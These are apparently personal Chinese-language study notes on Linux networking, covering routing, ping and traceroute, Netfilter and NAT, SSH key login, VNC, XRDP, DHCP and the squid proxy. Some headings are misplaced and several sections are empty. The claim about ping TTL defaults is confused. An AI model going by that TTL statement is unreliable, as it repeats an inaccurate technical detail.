AP, 无线接入点, 其本身就是个路由器, 有两个接口, 一个可以与外部的 IP 沟通, 另一个则是作为 LAN 内部其他主机的 GATEWAY.</p><p>Linux 的无线网卡网站说明: <a href="http://linux-wless.passys.nl/">http://linux-wless.passys.nl/</a></p><p>每台 AP 都会有一个联机的名字, 即 ESSID 和 SSID, SSID 可以提供给 Client 端, 当 Client 端需要进行无线连接时, 他必须说明它要利用哪一台 AP, ESSID 就是那时需要输入的数据.</p><h1 id="第5章-Linux-中常用的网络命令"><a href="#第5章-Linux-中常用的网络命令" class="headerlink" title="第5章 Linux 中常用的网络命令"></a>第5章 Linux 中常用的网络命令</h1><h1 id="5-1-网络参数设定使用的指令"><a href="#5-1-网络参数设定使用的指令" class="headerlink" title="5.1 网络参数设定使用的指令"></a>5.1 网络参数设定使用的指令</h1><p>主要使用的命令:</p><ul><li><code>ifconfig</code>: 查询, 设定网卡和 IP 网域等相关参数</li><li><code>ifup</code>, <code>ifdown</code>: 用于启动网络接口</li><li><code>route</code>: 查询, 设定路由表 </li><li><code>ip</code>, 一个汇总功能的命令</li></ul><p><code>ifconfig</code> 可以暂时手动来设定或修改某个网卡的功能, 可以添加虚拟网络接口.</p><p>如果以配置文件启动网络接口, 就是用 <code>ifup</code> 和 <code>ifdown</code></p><h3 id="5-1-2-路由修改-route"><a href="#5-1-2-路由修改-route" class="headerlink" title="5.1.2 路由修改: route"></a>5.1.2 路由修改: route</h3><p>一般来说, 只要有网络接口, 该接口就会产生一个路由.</p><p><code>Gateway</code> 为 <code>0.0.0.0</code> 表示该路由是直接由本机传送, 即通过局域网的 MAC 直接交流.</p><p><code>Flag</code> 的信息可以在 <code>man route</code> 中查看.</p><p>若出现:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">SIOCADDRT:</span> Network <span class="hljs-built_in">is</span> unreachable <br></code></pre></td></tr></table></figure><p>这样的报错, 其源于 <code>gw</code> 后面接的 IP 无法直接与你的网域沟通.</p><h2 id="5-2-网络排错与查看命令"><a href="#5-2-网络排错与查看命令" class="headerlink" title="5.2 网络排错与查看命令"></a>5.2 网络排错与查看命令</h2><h3 id="5-2-1-两台主机的两点沟通-ping"><a href="#5-2-1-两台主机的两点沟通-ping" class="headerlink" title="5.2.1 两台主机的两点沟通: ping"></a>5.2.1 两台主机的两点沟通: ping</h3><p>TTL 的默认值为 255.</p><p>如果你的主机与带检测主机并不在同一个网络内, 那么 TTL 默认使用 255, 如果是同一个网络内, 那么 TTL 则默认使用 64.</p><h3 id="5-2-2-两主机间各节点分析-traceroute"><a href="#5-2-2-两主机间各节点分析-traceroute" class="headerlink" title="5.2.2 两主机间各节点分析: traceroute"></a>5.2.2 两主机间各节点分析: traceroute</h3><p>traceroute 会对每个节点做 UDP 的回声等待, 并侦测回复的时间, 每节点侦测三次, 最终回传结果.</p><p>回传的星号表明, 该节点有某些防护措施, 让我们发送的数据包被丢弃.</p><p>某些路由器不接受来自客户端的各项侦测.<br><img src="/../img/traceroute_usage.png"></p><h3 id="5-2-4-检测主机名与-IP-的对应-host-nslookup"><a href="#5-2-4-检测主机名与-IP-的对应-host-nslookup" class="headerlink" title="5.2.4 检测主机名与 IP 的对应: host, nslookup"></a>5.2.4 检测主机名与 IP 的对应: host, nslookup</h3><p>host 命令可以用来查出某个主机名的 IP. 这个 IP 是向 <code>/etc/resolv.conf</code> 文件中的 DNS 服务器查询的.</p><p>也可指定查询主机.</p><h2 id="5-3-远程连接命令与即时通信软件"><a href="#5-3-远程连接命令与即时通信软件" class="headerlink" title="5.3 远程连接命令与即时通信软件"></a>5.3 远程连接命令与即时通信软件</h2><p>可以通过 Telent, SSH, 或者 FTP 等协议来进行远程主机登录.</p><h1 id="第8章-路由观念与路由器设定"><a href="#第8章-路由观念与路由器设定" class="headerlink" title="第8章 路由观念与路由器设定"></a>第8章 路由观念与路由器设定</h1><h2 id="8-1-路由"><a href="#8-1-路由" class="headerlink" title="8.1 路由"></a>8.1 路由</h2><h3 id="8-1-1-路由表产生的类型"><a href="#8-1-1-路由表产生的类型" class="headerlink" title="8.1.1 路由表产生的类型"></a>8.1.1 路由表产生的类型</h3><p>每一台主机都有自己的路由表.</p><p>查看路由表:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ route -n<br></code></pre></td></tr></table></figure><p>路由表主要有这几种情况来设计:</p><ul><li>依据网络接口产生的 IP 而存在的路由</li><li>手动或预设路由 (default route), 要注意, 所规划的路由必须是你的装置可以直接沟通的</li></ul><h3 id="8-1-2-一个网卡绑多个-IP-IP-Alias-的测试用途"><a href="#8-1-2-一个网卡绑多个-IP-IP-Alias-的测试用途" class="headerlink" title="8.1.2 一个网卡绑多个 IP: IP Alias 的测试用途"></a>8.1.2 一个网卡绑多个 IP: IP Alias 的测试用途</h3><p>利用 <code>ifconfig</code> 命令可以在 eth0 上模拟出一个虚拟接口.</p><p>IP 路由器的设置通常是使用 WWW 接口来提供的, 这个 IP 路由器通常会给予一个私有 IP, 即 192.168.0.1 来让用户开启 WWW 接口的预览.</p><p>所有的 IP Alias 都是由实体网卡仿真来的, 所以在启动 eth0:n 的模拟网卡时, eth0 必须要先被启动.</p><h4 id="开机时启动-IP-alias"><a href="#开机时启动-IP-alias" class="headerlink" title="开机时启动 IP alias"></a>开机时启动 IP alias</h4><p>建立 <code>/etc/sysconfig/network-scripts/ifcfg-eth0:0</code> 配置文件.</p><h3 id="8-1-3-重复路由问题"><a href="#8-1-3-重复路由问题" class="headerlink" title="8.1.3 重复路由问题"></a>8.1.3 重复路由问题</h3><p>同一部主机上面设定相同网域的 IP 时, 得特别留意你的路由规则.</p><h2 id="8-2-路由器架设"><a href="#8-2-路由器架设" class="headerlink" title="8.2 路由器架设"></a>8.2 路由器架设</h2><p>路由器会分析来源端数据包的 IP 表头, 在表头内找出要送达的目标 IP 后通过路由器本身的路由表 (routing table) 来将这个数据包向下一个目标(next hop) 传送.</p><p>查看内核是否启动了传递数据包的能力:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cat</span> /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><p>输出中为 <code>1</code> 表示启动了.</p><p>直接修改系统配置文件的内容, 可以在开机启动时启动.</p><ul><li>静态路由, 网域变化需要手动利用 route 指令修改.</li><li>动态路由, 自动侦测网域的变化并直接修改 Linux 内核的路由表信息.</li></ul><h3 id="8-2-3-静态路由之路由器"><a href="#8-2-3-静态路由之路由器" class="headerlink" title="8.2.3 静态路由之路由器"></a>8.2.3 静态路由之路由器</h3><p>只要是具有路由器功能的设备 (Route A, Linux Router) 都会具有两个以上的接口, 分别用来沟通不同的网域, 同时该路由也都会具有一个预设路由.</p><h1 id="第9章-防火墙与-NAT-服务器"><a href="#第9章-防火墙与-NAT-服务器" class="headerlink" title="第9章 防火墙与 NAT 服务器"></a>第9章 防火墙与 NAT 服务器</h1><p>Linux Netfilter 与 TCP Wrappers 两个机制来管理的.</p><p>通过 Netfilter 防火墙机制, 可以达到让私有 IP 的主机上网 (IP 路由器功能), 并且能够让 Internet 连到内部的私有 IP 所架设的 Linux 服务器 (DNAT 功能).</p><h2 id="9-1-认识防火墙"><a href="#9-1-认识防火墙" class="headerlink" title="9.1 认识防火墙"></a>9.1 认识防火墙</h2><p>防火墙可以分为硬件防火墙与本机的软件防火墙.</p><h3 id="9-1-3-Linux-系统上防火墙的主要类别"><a href="#9-1-3-Linux-系统上防火墙的主要类别" class="headerlink" title="9.1.3 Linux 系统上防火墙的主要类别"></a>9.1.3 Linux 系统上防火墙的主要类别</h3><p>主要的防火墙有数据包过滤型的 Netfilter 与依据服务软件程序作为分析的 TCP Wrappers 两种.</p><h4 id="1-Netfilter-数据包过滤机制"><a href="#1-Netfilter-数据包过滤机制" class="headerlink" title="1. Netfilter (数据包过滤机制)"></a>1. Netfilter (数据包过滤机制)</h4><p>数据包过滤, 即通过分析进入主机的网络数据包, 将数据包的头部数据提取出来进行分析, 以决定该连接为放行或抵挡的机制, 这种方式可以直接分析数据包头部数据, 所以包括 MAC, IP, TCP, UDP, ICMP 等数据包的信息都可以进行过滤分析.</p><p>Linux 使用内核内建的 Netfilter 机制, 提供 iptables 这个软件来作为防火墙数据包过滤的指令.</p><h4 id="2-TCP-Wrappers-程序管理"><a href="#2-TCP-Wrappers-程序管理" class="headerlink" title="2. TCP Wrappers (程序管理)"></a>2. TCP Wrappers (程序管理)</h4><p>分析谁对某程序进行访问, 通过规则去分析该服务器程序谁能够连接, 谁不能连接.</p><p>其与启动的端口无关, 只与程序的名称有关.</p><h2 id="9-5-NAT-服务器设定"><a href="#9-5-NAT-服务器设定" class="headerlink" title="9.5 NAT 服务器设定"></a>9.5 NAT 服务器设定</h2><p>NAT 是 Network Address Translation 的缩写.</p><h3 id="9-5-1-什么是-NAT-SNAT-DNAT"><a href="#9-5-1-什么是-NAT-SNAT-DNAT" class="headerlink" title="9.5.1 什么是 NAT ? SNAT ? DNAT ?"></a>9.5.1 什么是 NAT ? SNAT ? DNAT ?</h3><h4 id="3-Proxy-代理服务器"><a href="#3-Proxy-代理服务器" class="headerlink" title="3. Proxy (代理服务器)"></a>3. Proxy (代理服务器)</h4><h1 id="第11章-远程联机服务器-SSH-x2F-XDMCP-x2F-VNC-x2F-RDP"><a href="#第11章-远程联机服务器-SSH-x2F-XDMCP-x2F-VNC-x2F-RDP" class="headerlink" title="第11章 远程联机服务器 SSH &#x2F; XDMCP &#x2F; VNC &#x2F; RDP"></a>第11章 远程联机服务器 SSH &#x2F; XDMCP &#x2F; VNC &#x2F; RDP</h1><p>由于修改的 IP 不一样, 分为:</p><ul><li>SNAT (Source NAT, 修改 Source IP)</li><li>DNAT (Destination NAT, 修改 Destination IP)</li></ul><p>最常见的 IP 分享器就是一个路由器, 这个 IP 分享器一定会有一个 Public IP 和一个 Private IP.</p><p>比如:</p><ul><li>外部接口用 eth0, 这个接口有 public IP</li><li>内部接口用 eth1, 假设 IP 为 192.168.100.254</li></ul><h3 id="9-5-2-最简单的-NAT-服务器-IP-分享功能"><a href="#9-5-2-最简单的-NAT-服务器-IP-分享功能" class="headerlink" title="9.5.2 最简单的 NAT 服务器: IP 分享功能"></a>9.5.2 最简单的 NAT 服务器: IP 分享功能</h3><h2 id="11-1-远程联机服务器"><a href="#11-1-远程联机服务器" class="headerlink" title="11.1 远程联机服务器"></a>11.1 远程联机服务器</h2><h3 id="11-1-1-什么是远程联机服务器"><a href="#11-1-1-什么是远程联机服务器" class="headerlink" title="11.1.1 什么是远程联机服务器"></a>11.1.1 什么是远程联机服务器</h3><h2 id="11-2-文字接口联机服务器"><a href="#11-2-文字接口联机服务器" class="headerlink" title="11.2 文字接口联机服务器"></a>11.2 文字接口联机服务器</h2><p>SSH 是 Secure SHell protocol 的简写.</p><p>SSH 本身就提供两个服务器功能:</p><ul><li>类似 telnet 的远程联机使用 shell 的服务器</li><li>类似 FTP 服务的 sftp-server, 提供更安全的 FTP 服务</li></ul><p>非对称密钥 (Public and Private Key):</p><ul><li>公钥 (public key), 提供给远程主机进行数据加密的行为 </li><li>私钥 (privat key), 远程主机使用你的公钥加密的数据, 在本地端能够使用私钥来进行解密</li></ul><p>服务器端有客户端的公钥以及自己的私钥, 客户端有服务器端的公钥和自己的私钥.</p><p>在服务器端, 每一次启动 sshd 服务, 该服务会主动去找 <code>/etc/ssh/ssh_host*</code> 文件 (存放成对的公私钥), 若系统刚刚安装完成, 由于没有这些公钥文件, 因此 sshd 会主动去计算出这些需要的公钥文件, 同时也会计算出服务器自己需要的私钥文件. </p><p>服务器的公钥数据存放在客户端的 <code>~/.ssh/known_hosts</code> 文件中.</p><p>客户端的密钥实在随机运算产生于本次联机当中的, 所以你这次的联机与下次的联机的密钥可能会不一样.</p><h3 id="关于-ssh-自己的理解"><a href="#关于-ssh-自己的理解" class="headerlink" title="关于 ssh 自己的理解"></a>关于 ssh 自己的理解</h3><p>服务器上运行 sshd 进程，等待客户端的连接，在接收到连接请求后，先查看自己有没有钥匙对，若没有则创建，有则将自己的公钥发送给客户端. </p><p>客户端会将公钥数据存放在 <code>~/.ssh/known_hosts</code> 中. 客户端也会查看自己的钥匙对，并把自己的公钥发给服务器端.</p><p>免密登陆的核心是 <code>authorized_keys</code> 里的内容，里面存放公钥. 创建这个公钥的主机就可以免密登陆. 这里就相当于是用公钥替代了用户密码.</p><h3 id="11-2-2-启动-SSH-服务"><a href="#11-2-2-启动-SSH-服务" class="headerlink" title="11.2.2 启动 SSH 服务"></a>11.2.2 启动 SSH 服务</h3><p>在我的 Archlinux 上:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo systemctl start sshd<br></code></pre></td></tr></table></figure><p>一般架构在 port 22 上面.</p><p>sshd 这个服务包含很多指令, 包括 <code>ssh</code>, <code>sftp</code>, <code>scp</code> 等.</p><h3 id="11-2-3-ssh-客户端联机程序-Linux-用户"><a href="#11-2-3-ssh-客户端联机程序-Linux-用户" class="headerlink" title="11.2.3 ssh 客户端联机程序 - Linux 用户"></a>11.2.3 ssh 客户端联机程序 - Linux 用户</h3><h4 id="1-SSH-直接登入远程主机的指令"><a href="#1-SSH-直接登入远程主机的指令" class="headerlink" title="1. SSH: 直接登入远程主机的指令"></a>1. SSH: 直接登入远程主机的指令</h4><p>直接连接主机:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>ssh <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p>后面不加用户名, 就使用当前用户登录.</p><p>确认公钥指纹码时, 需要用 <code>Yes</code> 而不是 <code>Y/y</code>.</p><p>使用 student 帐号登录:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>ssh student<span class="hljs-variable">@127</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>使用 <code>-f</code> 选项, 只让对方主机执行命令而不登录.</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> ssh -f student@<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> find / &amp;&amp;<span class="hljs-keyword">gt</span>; ~/find1.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>使用 <code>-o</code> 选项指定项目:</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">$ ssh -o StrictHostKeyChecking=<span class="hljs-literal">no</span> root@localhost<br></code></pre></td></tr></table></figure><p><code>StrictHostKeyChecking=no</code> 能够不需要 <code>Yes</code> 确认添加主机到 <code>known_host</code> 文件中.</p><h4 id="2-服务器公钥记录文件-ssh-known-hosts"><a href="#2-服务器公钥记录文件-ssh-known-hosts" class="headerlink" title="2. 服务器公钥记录文件: ~/.ssh/known_hosts"></a>2. 服务器公钥记录文件: <code>~/.ssh/known_hosts</code></h4><p>当你登入远程服务器时, 本机会主动的用接受到的服务器的 public key 去对比 <code>~/.ssh/known_hosts</code> 中有无相关的公钥.</p><p>伪装 ssh 服务器, 就是返回伪装者的公钥.</p><p>若遇到因为公钥不同而导致的无法登入, 可以选择删除 <code>~/.ssh/known_hosts</code> 再重新添加.</p><h4 id="3-模拟-FTP-的文件传输方式-sftp"><a href="#3-模拟-FTP-的文件传输方式-sftp" class="headerlink" title="3. 模拟 FTP 的文件传输方式: sftp"></a>3. 模拟 FTP 的文件传输方式: sftp</h4><p><code>sftp</code> 和 <code>scp</code> (这个 cp 是 copy) 这两个命令都是使用 <code>ssh</code> 的隧道 (port 22), 只是模拟成 FTP 与复制的动作.</p><p>登录:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sftp student<span class="hljs-variable">@localhost</span><br></code></pre></td></tr></table></figure><p>有很多指令, 大部分和 bash 指令相同, 具体见书.</p><h4 id="4-文件异地直接复制-SCP"><a href="#4-文件异地直接复制-SCP" class="headerlink" title="4. 文件异地直接复制: SCP"></a>4. 文件异地直接复制: SCP</h4><p>通常使用 sftp 是因为可能不知道服务器上面已存在的文件名信息, 如果已经知道服务器上的文件名, 可以使用 scp 直接复制. 具体见书.</p><p>上传格式:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">scp <span class="hljs-selector-attr">[-pr]</span> <span class="hljs-selector-attr">[-l 速率]</span> file <span class="hljs-selector-attr">[帐号@]</span>主机:目录名<br></code></pre></td></tr></table></figure><p>下载格式:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">scp <span class="hljs-selector-attr">[-pr]</span> <span class="hljs-selector-attr">[-l 速率]</span>  <span class="hljs-selector-attr">[帐号@]</span>主机:file 目录名<br></code></pre></td></tr></table></figure><h3 id="11-2-5-SSHD-服务器详细配置"><a href="#11-2-5-SSHD-服务器详细配置" class="headerlink" title="11.2.5 SSHD 服务器详细配置"></a>11.2.5 SSHD 服务器详细配置</h3><p>基本上, 所有的 SSHD 服务器的详细设置都放在 <code>/etc/ssh/sshd_config</code> 配置文件中.</p><p>在配置文件内, 只要是未被注释的设置值, 即为 “默认值”.</p><p>具体见书.</p><p><code>LoginGraceTime</code> 就是设置经多长时间没连接上, 就断开.</p><h3 id="11-2-6-制作不用密码可立即登录的-SSH-用户"><a href="#11-2-6-制作不用密码可立即登录的-SSH-用户" class="headerlink" title="11.2.6 制作不用密码可立即登录的 SSH 用户"></a>11.2.6 制作不用密码可立即登录的 SSH 用户</h3><ul><li>Client 必须制作出 Public &amp; Private 这两把 Keys, 且 Private Key 需要放到 <code>~/.ssh/</code> 内</li><li>Server 必须要有 Public Key, 且放置到用户主目录下的 <code>~/.ssh/authorized_keys</code> 同时目录的权限 (<code>.ssh/</code>) 必须是 700 而文件权限必须为 644, 同时文件的属主与属组都必须与该帐号吻合才行</li></ul><p>登录其他主机时, 只要将你的 Public Key (即 id_rsa.pub) copy 到其他主机上面, 并且添加到某帐号的 <code>~/.ssh/authorized_keys</code> 文件中即可.</p><h3 id="11-2-7-简易安全设置"><a href="#11-2-7-简易安全设置" class="headerlink" title="11.2.7 简易安全设置"></a>11.2.7 简易安全设置</h3><h2 id="11-3-最原始图形接口-XDMCP-服务的启用"><a href="#11-3-最原始图形接口-XDMCP-服务的启用" class="headerlink" title="11.3 最原始图形接口: XDMCP 服务的启用"></a>11.3 最原始图形接口: XDMCP 服务的启用</h2><h3 id="11-3-1-X-Window-的-Server-x2F-Client-架构与各组件"><a href="#11-3-1-X-Window-的-Server-x2F-Client-架构与各组件" class="headerlink" title="11.3.1 X Window 的 Server&#x2F;Client 架构与各组件"></a>11.3.1 X Window 的 Server&#x2F;Client 架构与各组件</h3><p>X Client 主数据的处理 (就真的只是处理数据), X Server 主图形的绘制 (硬件也是 X Server 管理).</p><p>比如要在 Client 机子上面要打开一个软件, X Client 会将相关信息传递给 X Server 来绘制.</p><p>X Client 和 X Server 可以位于不同的机器中.</p><h3 id="11-3-2-设定-GDM-的-XDMCP-服务"><a href="#11-3-2-设定-GDM-的-XDMCP-服务" class="headerlink" title="11.3.2 设定 GDM 的 XDMCP 服务"></a>11.3.2 设定 GDM 的 XDMCP 服务</h3><h2 id="11-4-华丽的图形接口-VNC-服务器"><a href="#11-4-华丽的图形接口-VNC-服务器" class="headerlink" title="11.4 华丽的图形接口: VNC 服务器"></a>11.4 华丽的图形接口: VNC 服务器</h2><p>VNC 即 Virtual Network Computing.</p><h3 id="11-4-1-默认的-VNC-服务器"><a href="#11-4-1-默认的-VNC-服务器" class="headerlink" title="11.4.1 默认的 VNC 服务器"></a>11.4.1 默认的 VNC 服务器</h3><p>VNC Server 会在服务器端启动一个监听用户要求的端口, 一般端口号码在 5901 ~ 5910 之间. 当客户端启动 X Server 连接到 5901 之后, VNC Server 再将一堆预先设置好的 X Client 通过这个连接传递到客户端上.</p><p>一般来说, VNC Server 都是手动启动的, 使用完毕后, 再将 VNC Server 关闭即可.</p><p>使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ vncserver [:号码] [-geometry 分辨率] [options]<br></code></pre></td></tr></table></figure><p><code>:号码</code> 就是将 VNC Server 开在哪个端口, 如果是 <code>:1</code> 则代表 VNC 5901 端口.</p><p><code>-kill</code>, 将已经启动的 VNC 端口删除.</p><p>下载服务器软件:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S tigervnc-server<br></code></pre></td></tr></table></figure><p>建立的密码存放在 <code>.vnc/passwd</code> 文件中.</p><p>使用 <code>vncpasswd</code> 修改密码.</p><p>修改防火墙规则放开端口.</p><h3 id="11-4-2-VNC-的客户端连接软件"><a href="#11-4-2-VNC-的客户端连接软件" class="headerlink" title="11.4.2 VNC 的客户端连接软件"></a>11.4.2 VNC 的客户端连接软件</h3><h4 id="1-Linux-的客户端程序-VNC-Viewer"><a href="#1-Linux-的客户端程序-VNC-Viewer" class="headerlink" title="1. Linux 的客户端程序: VNC Viewer"></a>1. Linux 的客户端程序: VNC Viewer</h4><p>安装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S tigervnc<br></code></pre></td></tr></table></figure><p>连接, 需要指明服务端的图形接口:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ vncviewer 192.168.10.254:3<br></code></pre></td></tr></table></figure><p>一般建议使用一般身份来启动 VNC Server.</p><h3 id="11-4-3-VNC-搭配本机的-XDMCP-画面"><a href="#11-4-3-VNC-搭配本机的-XDMCP-画面" class="headerlink" title="11.4.3 VNC 搭配本机的 XDMCP 画面"></a>11.4.3 VNC 搭配本机的 XDMCP 画面</h3><h3 id="11-4-4-开机就启动-VNC-Server-的方法"><a href="#11-4-4-开机就启动-VNC-Server-的方法" class="headerlink" title="11.4.4 开机就启动 VNC Server 的方法"></a>11.4.4 开机就启动 VNC Server 的方法</h3><h3 id="11-4-5-同步的-VNC-可以通过图示同步教学"><a href="#11-4-5-同步的-VNC-可以通过图示同步教学" class="headerlink" title="11.4.5 同步的 VNC: 可以通过图示同步教学"></a>11.4.5 同步的 VNC: 可以通过图示同步教学</h3><p>参考 <a href="http://phorum.study-area.org/viewtopic.php?t=25713">网址</a></p><h2 id="11-5-仿真的远程桌面系统-XRDP-服务器"><a href="#11-5-仿真的远程桌面系统-XRDP-服务器" class="headerlink" title="11.5 仿真的远程桌面系统: XRDP 服务器"></a>11.5 仿真的远程桌面系统: XRDP 服务器</h2><p>XRDP 就是 Linux Remote Desktop Protocol. 其连接具有加密功能.</p><p>安装在需要被连接的主机上.</p><p>XRDP 会自动启动 VNC 来获取画面, 因此要配合 VNC 使用.</p><h2 id="11-6-SSH-服务器的高级应用"><a href="#11-6-SSH-服务器的高级应用" class="headerlink" title="11.6 SSH 服务器的高级应用"></a>11.6 SSH 服务器的高级应用</h2><h3 id="11-6-1-在非标准端口启动-SSH-非-Port-22"><a href="#11-6-1-在非标准端口启动-SSH-非-Port-22" class="headerlink" title="11.6.1 在非标准端口启动 SSH (非 Port 22)"></a>11.6.1 在非标准端口启动 SSH (非 Port 22)</h3><h1 id="第12章-网络参数控管者-DHCP-服务器"><a href="#第12章-网络参数控管者-DHCP-服务器" class="headerlink" title="第12章 网络参数控管者: DHCP 服务器"></a>第12章 网络参数控管者: DHCP 服务器</h1><p>一定需要的网络参数:<br>IP, netmask, network, broadcast, Gateway, DNS IP</p><h3 id="12-1-2-DHCP-协议的运作方式"><a href="#12-1-2-DHCP-协议的运作方式" class="headerlink" title="12.1.2 DHCP 协议的运作方式"></a>12.1.2 DHCP 协议的运作方式</h3><p>DHCP 通常用于局域网中, 由客户端广播数据包给物理网段内的所有主机, 若局域网中有 DHCP 服务器时, 才会响应客户端的 IP 参数要求.</p><p>DHCP Server 在接收到请求后, 会针对用户的 MAC 和本身设定的数据来配置:</p><ul><li>到服务器的登录文件中寻找该用户之前是否曾经用过某个 IP, 若有且该 IP 目前无人使用, 则提供此 IP 给客户端</li><li>若配置文件针对该 MAC 提供额外的固定 IP (static IP), 则提供该固定 IP</li><li>若都不符合, 随机分配并记录.</li></ul><p>在接受一个 DHCP Server 提供的参数后, Client 也会发送一个广播包给该物理段内的所有主机, 告知已经接受了该服务器的租约.</p><p>DHCP 的租约会到期, 可以重新申请.</p><p>可以设定 DHCP 服务器给予客户端的 IP 参数:</p><ul><li>固定 IP, 让计算机每次都能以一个固定的 IP 连上 Internet</li><li>动态 IP</li></ul><p>观察别人的 MAC, 用 <code>ping</code> 配合 <code>arp</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ping -c 3 192.168.1.254<br>$ arp -n<br></code></pre></td></tr></table></figure><p>设定期限的优点是避免 IP 被某些使用者一直占用.</p><p>一般来说, 假设租约期限是 T 小时, 那么客户端在 0.5T 会主动向 DHCP 服务器发出重新要求网络参数的数据包, 如果这次要求没有成功, 那么在 0.875T 后还会再次发送数据包一次.</p><p>多部 DHCP 服务器在同一个物理网段时, 先抢先赢.</p><h3 id="12-1-3-何时需要架设-DHCP-服务器"><a href="#12-1-3-何时需要架设-DHCP-服务器" class="headerlink" title="12.1.3 何时需要架设 DHCP 服务器"></a>12.1.3 何时需要架设 DHCP 服务器</h3><p>当公司内部有相当多的笔记本电脑时.</p><p>区域内计算机数量相当多时.</p><h1 id="第17章-局域网控制者-Proxy-服务器"><a href="#第17章-局域网控制者-Proxy-服务器" class="headerlink" title="第17章 局域网控制者: Proxy 服务器"></a>第17章 局域网控制者: Proxy 服务器</h1><p>代理服务器的功能是可以代理局域网络的个人计算机来向因特网取得网页或其他服务器的一种服务.</p><p>代理服务器使用在应用层上的一种防火墙方式, 而 iptables 是用在网络, 传输层.</p><p>Linux 上启动代理服务器的是 squid 这个软件.</p><h2 id="17-1-什么是代理服务器-Proxy"><a href="#17-1-什么是代理服务器-Proxy" class="headerlink" title="17.1 什么是代理服务器 (Proxy)"></a>17.1 什么是代理服务器 (Proxy)</h2><p>我们可以透过代理服务器来达成防火墙功能与用户浏览数据的分析.</p><p>也可以用代理服务器来达成节省宽带的目的.</p><h3 id="17-1-1-什么是代理服务器-Proxy"><a href="#17-1-1-什么是代理服务器-Proxy" class="headerlink" title="17.1.1 什么是代理服务器 (Proxy)"></a>17.1.1 什么是代理服务器 (Proxy)</h3><p>当客户端有因特网的数据要求时, Proxy 会帮用户去向目的地取得用户所需要的数据.</p><p>客户端向外部要求的资料事实上都是 Proxy 帮用户取得的, 因此因特网上面看到要求数据者, 将会是 Proxy 服务器的 IP 而不是客户端的 IP.</p><h3 id="17-1-2-代理服务器的运作流程"><a href="#17-1-2-代理服务器的运作流程" class="headerlink" title="17.1.2 代理服务器的运作流程"></a>17.1.2 代理服务器的运作流程</h3><h3 id="17-1-3-上层代理服务器"><a href="#17-1-3-上层代理服务器" class="headerlink" title="17.1.3 上层代理服务器"></a>17.1.3 上层代理服务器</h3><p>即指定另一台 Proxy 作为我的 Proxy 的 Proxy.</p><p>由于代理服务器需要管控信任的来源客户端计算机, 因此各 ISP 仅能针对自家的用户来开放 Proxy 使用权.</p><h3 id="17-1-4-代理服务器与-NAT-服务器的差异"><a href="#17-1-4-代理服务器与-NAT-服务器的差异" class="headerlink" title="17.1.4 代理服务器与 NAT 服务器的差异"></a>17.1.4 代理服务器与 NAT 服务器的差异</h3><h3 id="17-1-5-架设代理服务器的用途与优缺点"><a href="#17-1-5-架设代理服务器的用途与优缺点" class="headerlink" title="17.1.5 架设代理服务器的用途与优缺点"></a>17.1.5 架设代理服务器的用途与优缺点</h3><p>NAT 服务器是由较底层的网络进行分析的工作.</p><p>proxy 则主要是由一个 daemon 的功能达成的, 所以必须要符合该 daemon 的需求, 才能达到某些功能.</p><p>若要连上国外的网页, 最好使用 ISP 提供给你的代理服务器.</p><h2 id="17-2-Proxy-服务器的基础设定"><a href="#17-2-Proxy-服务器的基础设定" class="headerlink" title="17.2 Proxy 服务器的基础设定"></a>17.2 Proxy 服务器的基础设定</h2><p>在小型的网络环境中, 架设 Proxy 的用处不大.</p><h3 id="17-2-1-Proxy-所需的-squid-软件及其软件结构"><a href="#17-2-1-Proxy-所需的-squid-软件及其软件结构" class="headerlink" title="17.2.1 Proxy 所需的 squid 软件及其软件结构"></a>17.2.1 Proxy 所需的 squid 软件及其软件结构</h3><p>squid 主要提供的配置文件有:</p><ul><li><code>/etc/squid/squid.conf</code>, 其包含所有的设定</li><li><code>/etc/squid/mime.conf</code>, 设定 mine 格式</li></ul><p>其他重要的目录与文件:</p><ul><li><code>/usr/sbin/squid</code>, 提供 squid 主程序</li><li><code>/var/spool/squid</code>, 默认的 squid 缓存存储的目录</li><li><code>/usr/lib64/squid/</code>, 提供 squid 额外的控制模块, 